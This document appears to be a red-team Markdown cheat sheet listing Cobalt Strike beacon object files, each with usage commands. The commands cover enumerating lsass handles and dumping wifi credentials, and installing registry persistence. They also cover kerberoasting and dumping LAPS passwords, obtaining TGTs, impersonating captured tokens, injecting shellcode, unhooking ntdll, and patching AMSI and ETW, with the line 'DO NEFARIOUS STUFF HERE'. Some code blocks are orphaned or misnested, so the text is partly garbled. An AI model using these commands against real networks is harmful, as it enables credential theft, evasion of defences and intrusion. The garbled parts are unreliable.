### Enumeration

- [**TrustedSec Situational Awareness BOF**](https://github.com/trustedsec/CS-Situational-Awareness-BOF)<br />
BOF that provides host enumeration and awarness commands which are more opsec friendly<br />
Example commands include:<br />
```
arp --> List arp tables
ipconfig --> Run ipconfig
ldapsearch [query]
listdns --> Pulls DNS cache
netuser [username] [opt: domain] --> Get info on user account
nslookup [hostname] --> Perform DNS query
tasklist --> Get local running processes
```

- [**Find Objects BOF**](https://github.com/outflanknl/FindObjects-BOF)<br />
Use direct system calls to enumerate processes for specific loaded modules (amsi.dll, clr.dll) or process handles (lsass.exe)<br />
Avoids fork&run<br />
```
FindModule amsi.dll
FindProcHandle lsass.exe
```

- [**BOF Collection**](https://github.com/rvrsh3ll/BOF_Collection)<br />
A set of BOFs useful for enumeration and exploitation. Examples include:<br />
```
inline-execute GetDomainInfo.o --> Get domain info from DC

inline-execute GetClipboard.o --> Prints any text on the user's clipboard

enumwifi --> Enumerate wifi connections
dumpwifi Wifi_Profile_Name --> Dump wifi cleartext credentials

bofportscan 192.168.1.10 3389 --> Port scanner

inline-execute RegistryPersistence.o Install --> Install registry persistence
inline-execute RegistryPersistence.o Remove --> Remove registry persistence
```

- [**whereami**](https://github.com/boku7/whereami)<br />
A "Where Am I" BOF which is a way to run the whoami.exe binary but in an opsec safe way by pulling the info from the current beacon process memory.<br />
Also pulls current environment variables.<br />
```whereami```

- [**RiccardoAncarani BOFs**](https://github.com/RiccardoAncarani/BOFs)<br />
A useful BOF collection to perform various tasks in a safer opsec way.
```
send_shellcode_via_pipe <pipe> <file> --> Send shellcode or any byte via a named pipe
cat <file> --> Read file, supports remote shares
wts_enum_remote_processes <host> --> Enumerate remote processes using WTS APIs
unhook <module>, unhook ntdll.dll --> Use direct syscalls to unhook APIs of a specific DLL (works only on 64-bit beacons)
```

- [**Outflank C2 Tool Collection**](https://github.com/outflanknl/C2-Tool-Collection)<br />
Great list of useful tools converted to BOFs for better opsec.<br />
Tools like add machine account, kerberoast, LAPS password dump, SMB info, LDAP AD spray, and more!
```
GetMachineAccountQuota --> Get domain machine account quota
AddMachineAccount [*Computername] [Optional Password] --> Create new machine account - requires MachineAccountQuota to create new account
Domaininfo --> Enumerate AD domain
Kerberoast list --> List SPN enabled accounts
Kerberoast roast SamAccountName --> Kerberoast specific username
Lapsdump <computername> --> Dump LAPS passwowrds on remote systems within AD (requires elevated privileges on target)
Psc --> Show detailed information from processes with established TCP and RDP connections
Psw --> 	Show window titles from processes with active windows
Psx --> Show detailed information from all processes running on the system and provides a summary of installed security products and tools.
Smbinfo <compuername> --> Get SMB info of remote system instead of using CS portscan SMB
Winver --> Shows the version of Windows that is running on the local system
```

- [**tgtdelegation**](https://github.com/sliverarmory/tgtdelegation)<br />
Kerberos ticket delegation - Obtain usable TGTs for the current user, does not require Admin privileges!<br />
Request TGT of active user in the current domain obtained from USERDNSDOMAIN environment variable, outputs TGT blobs to .kirbi and .ccache files<br />
```
tgtdelegation currentdomain default
[+] received output:
[+] tgtdelegation succeeded!

[+] Invoking tgtParse.py to obtain a usable .ccache!

[+] Successfully decrypted the AP-REQ response!

[+] Local path to usable .ccache: /home/loki@MARVEL.LOCAL.ccache
[+] Local path to usable .kirbi: /home/loki@MARVEL.LOCAL.kirbi
```
Now use .ccache or .kirbi files offline on a Linux system to load TGT into memory: <br />
```export KRB5CCNAME=/home/loki@MARVEL.LOCAL.ccache``` <br />
Continue to use ticket in memory with other tooling of your choice through SOCKS proxy! (i.e. Impacket's `-k -no-pass` command) <br />

bofnet_listassemblies --> List loaded .NET assemblies
bofnet_load /Path/To/Assembly.exe --> Load assembly
bofnet_execute bof_name [args] --> Execute assembly
bofnet_shutdown --> Kill BOF.NET
```

```
threadless-inject <pid> <dll> <export function> <shellcode path>
threadless-inject 1234 ntdll.dll NtOpenFile shellcode.bin --> Inject into existing process
```

```kerberoast SPN/HOSTNAME.domain.local```

- [**Koh**](https://github.com/GhostPack/Koh)<br />
GhostPack BOF that allows for the capture of user credentials via purposeful token/logon session leakage.<br />
Koh has a BOF client for capturing logon tokens in Cobalt Strike and a C# capture server to negotiate captured tokens for new logon sessions.<br />
```
# Koh client BOF
help koh
  koh list              - lists captured tokens
  koh groups LUID       - lists the group SIDs for a captured token
  koh filter list       - lists the group SIDs used for capture filtering
  koh filter add SID    - adds a group SID for capture filtering
  koh filter remove SID - removes a group SID from capture filtering
  koh filter reset      - resets the SID group capture filter
  koh impersonate LUID  - impersonates the captured token with the give LUID
  koh release all       - releases all captured tokens
  koh release LUID      - releases the captured token for the specified LUID
  koh exit              - signals the Koh server to exit

koh list --> List current logon sessions
koh impersonate <LUID> --> Impersonate a logon session from above output

ls \\dc.theshire.local\C$ --> Use the impersonated privileged logon session to interact with a target system
```

```
patchit check --> List if AMSI or ETW are currently patched
patchit all --> Patch both AMSI and ETW
patchit amsi --> Only patch AMSI
patchit etw --> Only patch ETW

# DO NEFARIOUS STUFF HERE....

patchit revertAll --> Revert both AMSI and ETW
